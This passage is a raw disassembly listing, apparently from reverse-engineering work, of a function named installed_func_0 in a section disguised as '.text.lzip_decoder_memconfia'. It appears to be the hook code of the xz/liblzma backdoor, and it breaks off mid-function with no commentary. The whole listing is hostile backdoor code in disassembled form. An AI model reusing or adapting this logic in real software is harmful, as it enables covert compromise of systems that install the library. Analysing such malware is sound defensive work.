.text.lzip_decoder_memconfia:00000000000082B8                 push    r12
.text.lzip_decoder_memconfia:00000000000082BA                 mov     r12, rdi
.text.lzip_decoder_memconfia:00000000000082BD                 lea     rdi, [rbp-908h]
.text.lzip_decoder_memconfia:00000000000082C4                 push    rbx
.text.lzip_decoder_memconfia:00000000000082C5                 sub     rsp, 0E88h
.text.lzip_decoder_memconfia:00000000000082CC                 movups  xmmword ptr [rbp-918h], xmm0
.text.lzip_decoder_memconfia:00000000000082D3                 rep stosd
.text.lzip_decoder_memconfia:00000000000082D5                 mov     dword ptr [rbp-0E78h], 0FFFFFFFFh
.text.lzip_decoder_memconfia:00000000000082DF                 test    r12, r12
.text.lzip_decoder_memconfia:00000000000082E2                 jz      loc_893E
.text.lzip_decoder_memconfia:00000000000082E8                 mov     r9, [r12+10h]
.text.lzip_decoder_memconfia:00000000000082ED                 test    r9, r9
.text.lzip_decoder_memconfia:00000000000082F0                 jz      loc_893E
.text.lzip_decoder_memconfia:00000000000082F6                 mov     r10, [r12+18h]
.text.lzip_decoder_memconfia:00000000000082FB                 test    r10, r10
.text.lzip_decoder_memconfia:00000000000082FE                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008304                 mov     ecx, [r12]
.text.lzip_decoder_memconfia:0000000000008308                 mov     rbx, rsi
.text.lzip_decoder_memconfia:000000000000830B                 cmp     ecx, 3
.text.lzip_decoder_memconfia:000000000000830E                 jnz     short loc_8340
.text.lzip_decoder_memconfia:0000000000008310                 mov     rax, [r12+8]
.text.lzip_decoder_memconfia:0000000000008315                 test    byte ptr [rax+1], 40h
.text.lzip_decoder_memconfia:0000000000008319                 jnz     short loc_8340
.text.lzip_decoder_memconfia:000000000000831B                 cmp     qword ptr [r12+30h], 0
.text.lzip_decoder_memconfia:0000000000008321                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008327                 cmp     qword ptr [r12+20h], 0
.text.lzip_decoder_memconfia:000000000000832D                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008333                 cmp     word ptr [r12+28h], 30h ; '0'
.text.lzip_decoder_memconfia:000000000000833A                 jnz     loc_893E
.text.lzip_decoder_memconfia:0000000000008340
.text.lzip_decoder_memconfia:0000000000008340 loc_8340:                               ; CODE XREF: installed_func_0+6E↑j
.text.lzip_decoder_memconfia:0000000000008340                                         ; installed_func_0+79↑j
.text.lzip_decoder_memconfia:0000000000008340                 test    rbx, rbx
.text.lzip_decoder_memconfia:0000000000008343                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008349                 mov     r14, [rbx+8]
.text.lzip_decoder_memconfia:000000000000834D                 test    r14, r14
.text.lzip_decoder_memconfia:0000000000008350                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008356                 mov     rdi, [rbx+10h]
.text.lzip_decoder_memconfia:000000000000835A                 test    rdi, rdi
.text.lzip_decoder_memconfia:000000000000835D                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008363                 cmp     qword ptr [rdi+40h], 0
.text.lzip_decoder_memconfia:0000000000008368                 jz      loc_893E
.text.lzip_decoder_memconfia:000000000000836E                 cmp     qword ptr [rdi+50h], 0
.text.lzip_decoder_memconfia:0000000000008373                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008379                 mov     rsi, [rbx+20h]
.text.lzip_decoder_memconfia:000000000000837D                 cmp     dword ptr [rsi], 0
.text.lzip_decoder_memconfia:0000000000008380                 jnz     short loc_83CD
.text.lzip_decoder_memconfia:0000000000008382                 test    ecx, ecx
.text.lzip_decoder_memconfia:0000000000008384                 jz      loc_893E
.text.lzip_decoder_memconfia:000000000000838A                 mov     rax, [r12+8]
.text.lzip_decoder_memconfia:000000000000838F                 cmp     ecx, 3
.text.lzip_decoder_memconfia:0000000000008392                 jnz     short loc_83B8
.text.lzip_decoder_memconfia:0000000000008394                 test    byte ptr [rax+2], 20h
.text.lzip_decoder_memconfia:0000000000008398                 jnz     loc_893E
.text.lzip_decoder_memconfia:000000000000839E                 mov     rcx, [rsi+58h]
.text.lzip_decoder_memconfia:00000000000083A2                 mov     edx, 16h
.text.lzip_decoder_memconfia:00000000000083A7                 test    rcx, rcx
.text.lzip_decoder_memconfia:00000000000083AA                 jz      loc_847C
.text.lzip_decoder_memconfia:00000000000083B0                 mov     edx, [rcx-8]
.text.lzip_decoder_memconfia:00000000000083B3                 jmp     loc_847C
.text.lzip_decoder_memconfia:00000000000083B8 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000083B8
.text.lzip_decoder_memconfia:00000000000083B8 loc_83B8:                               ; CODE XREF: installed_func_0+F2↑j
.text.lzip_decoder_memconfia:00000000000083B8                 test    rax, rax
.text.lzip_decoder_memconfia:00000000000083BB                 jz      loc_8D5B
.text.lzip_decoder_memconfia:00000000000083C1                 cmp     ecx, 1
.text.lzip_decoder_memconfia:00000000000083C4                 jz      short loc_8407
.text.lzip_decoder_memconfia:00000000000083C6                 cmp     ecx, 2
.text.lzip_decoder_memconfia:00000000000083C9                 jnz     short loc_83E5
.text.lzip_decoder_memconfia:00000000000083CB                 jmp     short loc_841F
.text.lzip_decoder_memconfia:00000000000083CD ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000083CD
.text.lzip_decoder_memconfia:00000000000083CD loc_83CD:                               ; CODE XREF: installed_func_0+E0↑j
.text.lzip_decoder_memconfia:00000000000083CD                 mov     rax, [r12+8]
.text.lzip_decoder_memconfia:00000000000083D2                 test    rax, rax
.text.lzip_decoder_memconfia:00000000000083D5                 jz      short loc_844D
.text.lzip_decoder_memconfia:00000000000083D7                 cmp     ecx, 1
.text.lzip_decoder_memconfia:00000000000083DA                 jz      short loc_8407
.text.lzip_decoder_memconfia:00000000000083DC                 cmp     ecx, 2
.text.lzip_decoder_memconfia:00000000000083DF                 jz      short loc_841F
.text.lzip_decoder_memconfia:00000000000083E1                 test    ecx, ecx
.text.lzip_decoder_memconfia:00000000000083E3                 jz      short loc_83FD
.text.lzip_decoder_memconfia:00000000000083E5
.text.lzip_decoder_memconfia:00000000000083E5 loc_83E5:                               ; CODE XREF: installed_func_0+129↑j
.text.lzip_decoder_memconfia:00000000000083E5                 mov     r11, [rsi+58h]
.text.lzip_decoder_memconfia:00000000000083E9                 mov     edx, 16h
.text.lzip_decoder_memconfia:00000000000083EE                 test    r11, r11
.text.lzip_decoder_memconfia:00000000000083F1                 jz      loc_8477
.text.lzip_decoder_memconfia:00000000000083F7                 mov     edx, [r11-8]
.text.lzip_decoder_memconfia:00000000000083FB                 jmp     short loc_8477
.text.lzip_decoder_memconfia:00000000000083FD ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000083FD
.text.lzip_decoder_memconfia:00000000000083FD loc_83FD:                               ; CODE XREF: installed_func_0+143↑j
.text.lzip_decoder_memconfia:00000000000083FD                 mov     dl, [rax+2]
.text.lzip_decoder_memconfia:0000000000008400                 and     dl, 3Fh
.text.lzip_decoder_memconfia:0000000000008403                 jz      short loc_843A
.text.lzip_decoder_memconfia:0000000000008405                 jmp     short loc_8458
.text.lzip_decoder_memconfia:0000000000008407 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008407
.text.lzip_decoder_memconfia:0000000000008407 loc_8407:                               ; CODE XREF: installed_func_0+124↑j
.text.lzip_decoder_memconfia:0000000000008407                                         ; installed_func_0+13A↑j
.text.lzip_decoder_memconfia:0000000000008407                 movzx   edx, byte ptr [rax+2]
.text.lzip_decoder_memconfia:000000000000840B                 test    edx, edx
.text.lzip_decoder_memconfia:000000000000840D                 jnz     short loc_846F
.text.lzip_decoder_memconfia:000000000000840F                 mov     rdx, [rsi+58h]
.text.lzip_decoder_memconfia:0000000000008413                 test    rdx, rdx
.text.lzip_decoder_memconfia:0000000000008416                 jnz     short loc_8448
.text.lzip_decoder_memconfia:0000000000008418                 mov     edx, 16h
.text.lzip_decoder_memconfia:000000000000841D                 jmp     short loc_846F
.text.lzip_decoder_memconfia:000000000000841F ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000841F
.text.lzip_decoder_memconfia:000000000000841F loc_841F:                               ; CODE XREF: installed_func_0+12B↑j
.text.lzip_decoder_memconfia:000000000000841F                                         ; installed_func_0+13F↑j
.text.lzip_decoder_memconfia:000000000000841F                 movzx   edx, byte ptr [rax+2]
.text.lzip_decoder_memconfia:0000000000008423                 test    edx, edx
.text.lzip_decoder_memconfia:0000000000008425                 jnz     short loc_848F
.text.lzip_decoder_memconfia:0000000000008427                 mov     rcx, [rsi+58h]
.text.lzip_decoder_memconfia:000000000000842B                 mov     edx, 16h
.text.lzip_decoder_memconfia:0000000000008430                 test    rcx, rcx
.text.lzip_decoder_memconfia:0000000000008433                 jz      short loc_848F
.text.lzip_decoder_memconfia:0000000000008435                 mov     edx, [rcx-8]
.text.lzip_decoder_memconfia:0000000000008438                 jmp     short loc_848F
.text.lzip_decoder_memconfia:000000000000843A ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000843A
.text.lzip_decoder_memconfia:000000000000843A loc_843A:                               ; CODE XREF: installed_func_0+163↑j
.text.lzip_decoder_memconfia:000000000000843A                 mov     rdx, [rsi+58h]
.text.lzip_decoder_memconfia:000000000000843E                 test    rdx, rdx
.text.lzip_decoder_memconfia:0000000000008441                 jz      short loc_845F
.text.lzip_decoder_memconfia:0000000000008443                 mov     edx, [rdx-8]
.text.lzip_decoder_memconfia:0000000000008446                 jmp     short loc_8464
.text.lzip_decoder_memconfia:0000000000008448 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008448
.text.lzip_decoder_memconfia:0000000000008448 loc_8448:                               ; CODE XREF: installed_func_0+176↑j
.text.lzip_decoder_memconfia:0000000000008448                 mov     edx, [rdx-8]
.text.lzip_decoder_memconfia:000000000000844B                 jmp     short loc_846F
.text.lzip_decoder_memconfia:000000000000844D ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000844D
.text.lzip_decoder_memconfia:000000000000844D loc_844D:                               ; CODE XREF: installed_func_0+135↑j
.text.lzip_decoder_memconfia:000000000000844D                 mov     edx, 16h
.text.lzip_decoder_memconfia:0000000000008452                 test    ecx, ecx
.text.lzip_decoder_memconfia:0000000000008454                 jz      short loc_8464
.text.lzip_decoder_memconfia:0000000000008456                 jmp     short loc_846A
.text.lzip_decoder_memconfia:0000000000008458 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008458
.text.lzip_decoder_memconfia:0000000000008458 loc_8458:                               ; CODE XREF: installed_func_0+165↑j
.text.lzip_decoder_memconfia:0000000000008458                 movzx   edx, dl
.text.lzip_decoder_memconfia:000000000000845B                 add     edx, edx
.text.lzip_decoder_memconfia:000000000000845D                 jmp     short loc_8464
.text.lzip_decoder_memconfia:000000000000845F ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000845F
.text.lzip_decoder_memconfia:000000000000845F loc_845F:                               ; CODE XREF: installed_func_0+1A1↑j
.text.lzip_decoder_memconfia:000000000000845F                 mov     edx, 16h
.text.lzip_decoder_memconfia:0000000000008464
.text.lzip_decoder_memconfia:0000000000008464 loc_8464:                               ; CODE XREF: installed_func_0+1A6↑j
.text.lzip_decoder_memconfia:0000000000008464                                         ; installed_func_0+1B4↑j ...
.text.lzip_decoder_memconfia:0000000000008464                 cmp     byte ptr [rax+1], 0
.text.lzip_decoder_memconfia:0000000000008468                 jmp     short loc_8480
.text.lzip_decoder_memconfia:000000000000846A ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000846A
.text.lzip_decoder_memconfia:000000000000846A loc_846A:                               ; CODE XREF: installed_func_0+1B6↑j
.text.lzip_decoder_memconfia:000000000000846A                 cmp     ecx, 1
.text.lzip_decoder_memconfia:000000000000846D                 jnz     short loc_8477
.text.lzip_decoder_memconfia:000000000000846F
.text.lzip_decoder_memconfia:000000000000846F loc_846F:                               ; CODE XREF: installed_func_0+16D↑j
.text.lzip_decoder_memconfia:000000000000846F                                         ; installed_func_0+17D↑j ...
.text.lzip_decoder_memconfia:000000000000846F                 test    byte ptr [rax+1], 1
.text.lzip_decoder_memconfia:0000000000008473                 jz      short loc_8482
.text.lzip_decoder_memconfia:0000000000008475                 jmp     short loc_848F
.text.lzip_decoder_memconfia:0000000000008477 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008477
.text.lzip_decoder_memconfia:0000000000008477 loc_8477:                               ; CODE XREF: installed_func_0+151↑j
.text.lzip_decoder_memconfia:0000000000008477                                         ; installed_func_0+15B↑j ...
.text.lzip_decoder_memconfia:0000000000008477                 cmp     ecx, 3
.text.lzip_decoder_memconfia:000000000000847A                 jnz     short loc_848F
.text.lzip_decoder_memconfia:000000000000847C
.text.lzip_decoder_memconfia:000000000000847C loc_847C:                               ; CODE XREF: installed_func_0+10A↑j
.text.lzip_decoder_memconfia:000000000000847C                                         ; installed_func_0+113↑j
.text.lzip_decoder_memconfia:000000000000847C                 cmp     byte ptr [rax+3], 0
.text.lzip_decoder_memconfia:0000000000008480
.text.lzip_decoder_memconfia:0000000000008480 loc_8480:                               ; CODE XREF: installed_func_0+1C8↑j
.text.lzip_decoder_memconfia:0000000000008480                 js      short loc_848F
.text.lzip_decoder_memconfia:0000000000008482
.text.lzip_decoder_memconfia:0000000000008482 loc_8482:                               ; CODE XREF: installed_func_0+1D3↑j
.text.lzip_decoder_memconfia:0000000000008482                 mov     rcx, [rsi+0C8h]
.text.lzip_decoder_memconfia:0000000000008489                 mov     dword ptr [rcx], 3
.text.lzip_decoder_memconfia:000000000000848F
.text.lzip_decoder_memconfia:000000000000848F loc_848F:                               ; CODE XREF: installed_func_0+185↑j
.text.lzip_decoder_memconfia:000000000000848F                                         ; installed_func_0+193↑j ...
.text.lzip_decoder_memconfia:000000000000848F                 mov     ecx, [r12]
.text.lzip_decoder_memconfia:0000000000008493                 cmp     ecx, 1
.text.lzip_decoder_memconfia:0000000000008496                 jbe     loc_8537
.text.lzip_decoder_memconfia:000000000000849C                 cmp     ecx, 3
.text.lzip_decoder_memconfia:000000000000849F                 jz      loc_8537
.text.lzip_decoder_memconfia:00000000000084A5
.text.lzip_decoder_memconfia:00000000000084A5 loc_84A5:                               ; CODE XREF: installed_func_0+2B5↓j
.text.lzip_decoder_memconfia:00000000000084A5                                         ; installed_func_0+2C9↓j
.text.lzip_decoder_memconfia:00000000000084A5                 xor     eax, eax
.text.lzip_decoder_memconfia:00000000000084A7                 lea     rdi, [rbp-0B18h]
.text.lzip_decoder_memconfia:00000000000084AE                 xorps   xmm0, xmm0
.text.lzip_decoder_memconfia:00000000000084B1                 mov     r11, [rbx+38h]
.text.lzip_decoder_memconfia:00000000000084B5                 mov     ecx, 69h ; 'i'
.text.lzip_decoder_memconfia:00000000000084BA                 movups  xmmword ptr [rbp-0D38h], xmm0
.text.lzip_decoder_memconfia:00000000000084C1                 rep stosd
.text.lzip_decoder_memconfia:00000000000084C3                 lea     rdi, [rbp-0C38h]
.text.lzip_decoder_memconfia:00000000000084CA                 mov     ecx, 47h ; 'G'
.text.lzip_decoder_memconfia:00000000000084CF                 mov     byte ptr [rbp-0E79h], 1
.text.lzip_decoder_memconfia:00000000000084D6                 rep stosd
.text.lzip_decoder_memconfia:00000000000084D8                 xor     edi, edi
.text.lzip_decoder_memconfia:00000000000084DA                 mov     ecx, 3Ch ; '<'
.text.lzip_decoder_memconfia:00000000000084DF                 test    r11, r11
.text.lzip_decoder_memconfia:00000000000084E2                 mov     [rbp-0E74h], edi
.text.lzip_decoder_memconfia:00000000000084E8                 lea     rdi, [rbp-0E28h]
.text.lzip_decoder_memconfia:00000000000084EF                 rep stosd
.text.lzip_decoder_memconfia:00000000000084F1                 lea     rdi, [rbp-0D28h]
.text.lzip_decoder_memconfia:00000000000084F8                 mov     ecx, 3Ch ; '<'
.text.lzip_decoder_memconfia:00000000000084FD                 movups  xmmword ptr [rbp-0E58h], xmm0
.text.lzip_decoder_memconfia:0000000000008504                 rep stosd
.text.lzip_decoder_memconfia:0000000000008506                 lea     rax, [rbp-0B18h]
.text.lzip_decoder_memconfia:000000000000850D                 movups  xmmword ptr [rbp-0E48h], xmm0
.text.lzip_decoder_memconfia:0000000000008514                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:000000000000851B                 lea     rax, [rbp-0C38h]
.text.lzip_decoder_memconfia:0000000000008522                 mov     [rbp-0EA0h], rax
.text.lzip_decoder_memconfia:0000000000008529                 movups  xmmword ptr [rbp-0E38h], xmm0
.text.lzip_decoder_memconfia:0000000000008530                 jnz     short loc_856E
.text.lzip_decoder_memconfia:0000000000008532                 jmp     loc_893E
.text.lzip_decoder_memconfia:0000000000008537 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008537
.text.lzip_decoder_memconfia:0000000000008537 loc_8537:                               ; CODE XREF: installed_func_0+1F6↑j
.text.lzip_decoder_memconfia:0000000000008537                                         ; installed_func_0+1FF↑j
.text.lzip_decoder_memconfia:0000000000008537                 test    byte ptr [rax], 40h
.text.lzip_decoder_memconfia:000000000000853A                 jz      short loc_8550
.text.lzip_decoder_memconfia:000000000000853C                 mov     rcx, [rsi+0C0h]
.text.lzip_decoder_memconfia:0000000000008543                 test    rcx, rcx
.text.lzip_decoder_memconfia:0000000000008546                 jz      loc_893E
.text.lzip_decoder_memconfia:000000000000854C                 xor     esi, esi
.text.lzip_decoder_memconfia:000000000000854E                 mov     [rcx], esi
.text.lzip_decoder_memconfia:0000000000008550
.text.lzip_decoder_memconfia:0000000000008550 loc_8550:                               ; CODE XREF: installed_func_0+29A↑j
.text.lzip_decoder_memconfia:0000000000008550                 cmp     dword ptr [r12], 3
.text.lzip_decoder_memconfia:0000000000008555                 jnz     loc_84A5
.text.lzip_decoder_memconfia:000000000000855B                 mov     al, [rax+1]
.text.lzip_decoder_memconfia:000000000000855E                 and     eax, 0FFFFFFC0h
.text.lzip_decoder_memconfia:0000000000008561                 cmp     al, 0C0h
.text.lzip_decoder_memconfia:0000000000008563                 jnz     loc_86E8
.text.lzip_decoder_memconfia:0000000000008569                 jmp     loc_84A5
.text.lzip_decoder_memconfia:000000000000856E ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000856E
.text.lzip_decoder_memconfia:000000000000856E loc_856E:                               ; CODE XREF: installed_func_0+290↑j
.text.lzip_decoder_memconfia:000000000000856E                 cmp     qword ptr [rbx+40h], 0
.text.lzip_decoder_memconfia:0000000000008573                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008579                 lea     rdi, [r14+0D0h]
.text.lzip_decoder_memconfia:0000000000008580                 mov     esi, 9
.text.lzip_decoder_memconfia:0000000000008585                 call    sub_71A0
.text.lzip_decoder_memconfia:000000000000858A                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000858C                 jnz     loc_893E
.text.lzip_decoder_memconfia:0000000000008592                 lea     rcx, [rbp-918h]
.text.lzip_decoder_memconfia:0000000000008599                 xor     r15d, r15d
.text.lzip_decoder_memconfia:000000000000859C                 xor     r13d, r13d
.text.lzip_decoder_memconfia:000000000000859F                 mov     [rbp-0B14h], dl
.text.lzip_decoder_memconfia:00000000000085A5                 mov     [rbp-0E98h], rcx
.text.lzip_decoder_memconfia:00000000000085AC                 mov     rdi, [rbp-0E98h]
.text.lzip_decoder_memconfia:00000000000085B3                 mov     ecx, 23Ah
.text.lzip_decoder_memconfia:00000000000085B8                 lea     rsi, [rbp-0E38h]
.text.lzip_decoder_memconfia:00000000000085BF                 mov     dword ptr [rbp-0B13h], 2000000h
.text.lzip_decoder_memconfia:00000000000085C9                 rep stosd
.text.lzip_decoder_memconfia:00000000000085CB                 lea     rdi, [rbp-0AB3h]
.text.lzip_decoder_memconfia:00000000000085D2                 mov     dword ptr [rbp-0B03h], 1C000000h
.text.lzip_decoder_memconfia:00000000000085DC                 mov     ecx, 40h ; '@'
.text.lzip_decoder_memconfia:00000000000085E1                 mov     [rbp-0E68h], r10
.text.lzip_decoder_memconfia:00000000000085E8                 movups  xmm1, xmmword ptr [r11]
.text.lzip_decoder_memconfia:00000000000085EC                 mov     byte ptr [rbp-0E38h], 80h
.text.lzip_decoder_memconfia:00000000000085F3                 mov     [rbp-0E60h], r9
.text.lzip_decoder_memconfia:00000000000085FA                 movups  xmmword ptr [rbp-0AFFh], xmm1
.text.lzip_decoder_memconfia:0000000000008601                 movups  xmm2, xmmword ptr [r11+0Ch]
.text.lzip_decoder_memconfia:0000000000008606                 mov     dword ptr [rbp-0AE3h], 20000000h
.text.lzip_decoder_memconfia:0000000000008610                 mov     byte ptr [rbp-0D42h], 8
.text.lzip_decoder_memconfia:0000000000008617                 mov     byte ptr [rbp-0D39h], 1
.text.lzip_decoder_memconfia:000000000000861E                 mov     dword ptr [rbp-0ABFh], 3000000h
.text.lzip_decoder_memconfia:0000000000008628                 mov     byte ptr [rbp-0ABBh], 1
.text.lzip_decoder_memconfia:000000000000862F                 mov     byte ptr [rbp-0AB9h], 1
.text.lzip_decoder_memconfia:0000000000008636                 mov     dword ptr [rbp-0AB8h], 1010000h
.text.lzip_decoder_memconfia:0000000000008640                 movups  xmmword ptr [rbp-0AF3h], xmm2
.text.lzip_decoder_memconfia:0000000000008647                 rep movsd
.text.lzip_decoder_memconfia:0000000000008649                 mov     esi, 628h
.text.lzip_decoder_memconfia:000000000000864E                 mov     dword ptr [rbp-9ABh], 1000000h
.text.lzip_decoder_memconfia:0000000000008658                 mov     dword ptr [rbp-97Fh], 7000000h
.text.lzip_decoder_memconfia:0000000000008662                 mov     eax, [r11]
.text.lzip_decoder_memconfia:0000000000008665                 mov     [rbp-97Bh], eax
.text.lzip_decoder_memconfia:000000000000866B                 mov     eax, [r11+3]
.text.lzip_decoder_memconfia:000000000000866F                 mov     [rbp-978h], eax
.text.lzip_decoder_memconfia:0000000000008675                 lea     rax, [rbp-0E70h]
.text.lzip_decoder_memconfia:000000000000867C                 mov     [rbp-0E88h], rax
.text.lzip_decoder_memconfia:0000000000008683
.text.lzip_decoder_memconfia:0000000000008683 loc_8683:                               ; CODE XREF: installed_func_0+446↓j
.text.lzip_decoder_memconfia:0000000000008683                 xor     ecx, ecx
.text.lzip_decoder_memconfia:0000000000008685                 mov     rdx, [rbp-0E88h]
.text.lzip_decoder_memconfia:000000000000868C                 mov     r8, r14
.text.lzip_decoder_memconfia:000000000000868F                 lea     rdi, [rbp+r13-774h]
.text.lzip_decoder_memconfia:0000000000008697                 mov     [rbp-0E70h], rcx
.text.lzip_decoder_memconfia:000000000000869E                 mov     rcx, [rbp+r15*8-0E68h]
.text.lzip_decoder_memconfia:00000000000086A6                 mov     [rbp-0EA8h], rsi
.text.lzip_decoder_memconfia:00000000000086AD                 call    sub_7350
.text.lzip_decoder_memconfia:00000000000086B2                 test    eax, eax
.text.lzip_decoder_memconfia:00000000000086B4                 jz      loc_893E
.text.lzip_decoder_memconfia:00000000000086BA                 mov     rax, [rbp-0E70h]
.text.lzip_decoder_memconfia:00000000000086C1                 mov     rsi, [rbp-0EA8h]
.text.lzip_decoder_memconfia:00000000000086C8                 cmp     rsi, rax
.text.lzip_decoder_memconfia:00000000000086CB                 jb      loc_893E
.text.lzip_decoder_memconfia:00000000000086D1                 add     r13, rax
.text.lzip_decoder_memconfia:00000000000086D4                 sub     rsi, rax
.text.lzip_decoder_memconfia:00000000000086D7                 test    r15, r15
.text.lzip_decoder_memconfia:00000000000086DA                 jnz     loc_8AF7
.text.lzip_decoder_memconfia:00000000000086E0                 mov     r15d, 1
.text.lzip_decoder_memconfia:00000000000086E6                 jmp     short loc_8683
.text.lzip_decoder_memconfia:00000000000086E8 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000086E8
.text.lzip_decoder_memconfia:00000000000086E8 loc_86E8:                               ; CODE XREF: installed_func_0+2C3↑j
.text.lzip_decoder_memconfia:00000000000086E8                 cmp     al, 40h ; '@'
.text.lzip_decoder_memconfia:00000000000086EA                 jnz     short loc_8702
.text.lzip_decoder_memconfia:00000000000086EC                 mov     rax, [rdi+18h]
.text.lzip_decoder_memconfia:00000000000086F0                 test    rax, rax
.text.lzip_decoder_memconfia:00000000000086F3                 jz      loc_893E
.text.lzip_decoder_memconfia:00000000000086F9                 xor     edi, edi
.text.lzip_decoder_memconfia:00000000000086FB                 call    rax
.text.lzip_decoder_memconfia:00000000000086FD                 jmp     loc_893E
.text.lzip_decoder_memconfia:0000000000008702 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008702
.text.lzip_decoder_memconfia:0000000000008702 loc_8702:                               ; CODE XREF: installed_func_0+44A↑j
.text.lzip_decoder_memconfia:0000000000008702                 cmp     word ptr [r12+28h], 2Fh ; '/'
.text.lzip_decoder_memconfia:0000000000008709                 jbe     loc_893E
.text.lzip_decoder_memconfia:000000000000870F                 mov     r15, [r12+20h]
.text.lzip_decoder_memconfia:0000000000008714                 mov     rax, [r15]
.text.lzip_decoder_memconfia:0000000000008717                 mov     r14, [r15+8]
.text.lzip_decoder_memconfia:000000000000871B                 mov     [rbp-0EA8h], rax
.text.lzip_decoder_memconfia:0000000000008722                 lea     rax, [r14-11h]
.text.lzip_decoder_memconfia:0000000000008726                 cmp     rax, 3FEFh
.text.lzip_decoder_memconfia:000000000000872C                 ja      loc_893E
.text.lzip_decoder_memconfia:0000000000008732                 mov     rdx, [rdi+68h]
.text.lzip_decoder_memconfia:0000000000008736                 lea     rax, [rbp+8]
.text.lzip_decoder_memconfia:000000000000873A                 and     rax, 0FFFFFFFFFFFFFFF8h
.text.lzip_decoder_memconfia:000000000000873E                 mov     [rbp-0E98h], rdx
.text.lzip_decoder_memconfia:0000000000008745                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:000000000000874C
.text.lzip_decoder_memconfia:000000000000874C loc_874C:                               ; CODE XREF: installed_func_0+4DB↓j
.text.lzip_decoder_memconfia:000000000000874C                 mov     rdx, [rbp-0E98h]
.text.lzip_decoder_memconfia:0000000000008753                 cmp     [rbp-0E90h], rdx
.text.lzip_decoder_memconfia:000000000000875A                 jnb     loc_893E
.text.lzip_decoder_memconfia:0000000000008760                 mov     rax, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008767                 mov     r13, [rax]
.text.lzip_decoder_memconfia:000000000000876A                 cmp     r13, 0FFFFFFh
.text.lzip_decoder_memconfia:0000000000008771                 ja      short loc_877D
.text.lzip_decoder_memconfia:0000000000008773
.text.lzip_decoder_memconfia:0000000000008773 loc_8773:                               ; CODE XREF: installed_func_0+4FC↓j
.text.lzip_decoder_memconfia:0000000000008773                                         ; installed_func_0+527↓j
.text.lzip_decoder_memconfia:0000000000008773                 add     qword ptr [rbp-0E90h], 8
.text.lzip_decoder_memconfia:000000000000877B                 jmp     short loc_874C
.text.lzip_decoder_memconfia:000000000000877D ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000877D
.text.lzip_decoder_memconfia:000000000000877D loc_877D:                               ; CODE XREF: installed_func_0+4D1↑j
.text.lzip_decoder_memconfia:000000000000877D                 mov     eax, 4001h
.text.lzip_decoder_memconfia:0000000000008782                 mov     rdx, rbx
.text.lzip_decoder_memconfia:0000000000008785                 mov     rdi, r13
.text.lzip_decoder_memconfia:0000000000008788                 sub     rax, r14
.text.lzip_decoder_memconfia:000000000000878B                 mov     rsi, rax
.text.lzip_decoder_memconfia:000000000000878E                 mov     [rbp-0E88h], rax
.text.lzip_decoder_memconfia:0000000000008795                 call    _Lhc_find_func_1 ; PIC mode
.text.lzip_decoder_memconfia:000000000000879A                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000879C                 jz      short loc_8773
.text.lzip_decoder_memconfia:000000000000879E                 mov     rax, [rbp-0E88h]
.text.lzip_decoder_memconfia:00000000000087A5                 add     rax, r13
.text.lzip_decoder_memconfia:00000000000087A8                 mov     [rbp-0EA0h], rax
.text.lzip_decoder_memconfia:00000000000087AF                 lea     rax, [rbp-0B18h]
.text.lzip_decoder_memconfia:00000000000087B6                 mov     [rbp-0E88h], rax
.text.lzip_decoder_memconfia:00000000000087BD
.text.lzip_decoder_memconfia:00000000000087BD loc_87BD:                               ; CODE XREF: installed_func_0+5B6↓j
.text.lzip_decoder_memconfia:00000000000087BD                 mov     rax, [rbp-0EA0h]
.text.lzip_decoder_memconfia:00000000000087C4                 cmp     r13, rax
.text.lzip_decoder_memconfia:00000000000087C7                 jnb     short loc_8773
.text.lzip_decoder_memconfia:00000000000087C9                 xorps   xmm0, xmm0
.text.lzip_decoder_memconfia:00000000000087CC                 mov     rax, [rbp-0EA8h]
.text.lzip_decoder_memconfia:00000000000087D3                 movups  xmmword ptr [rbp-0B18h], xmm0
.text.lzip_decoder_memconfia:00000000000087DA                 movups  xmmword ptr [rbp-0B08h], xmm0
.text.lzip_decoder_memconfia:00000000000087E1                 cmp     [r13+0], rax
.text.lzip_decoder_memconfia:00000000000087E5                 jnz     short loc_8853
.text.lzip_decoder_memconfia:00000000000087E7                 mov     r8, [rbx+8]
.text.lzip_decoder_memconfia:00000000000087EB                 mov     ecx, 20h ; ' '
.text.lzip_decoder_memconfia:00000000000087F0                 mov     rsi, r14
.text.lzip_decoder_memconfia:00000000000087F3                 mov     rdi, r13
.text.lzip_decoder_memconfia:00000000000087F6                 mov     rdx, [rbp-0E88h]
.text.lzip_decoder_memconfia:00000000000087FD                 call    sub_72E0
.text.lzip_decoder_memconfia:0000000000008802                 test    eax, eax
.text.lzip_decoder_memconfia:0000000000008804                 jz      short loc_8853
.text.lzip_decoder_memconfia:0000000000008806                 xor     eax, eax
.text.lzip_decoder_memconfia:0000000000008808
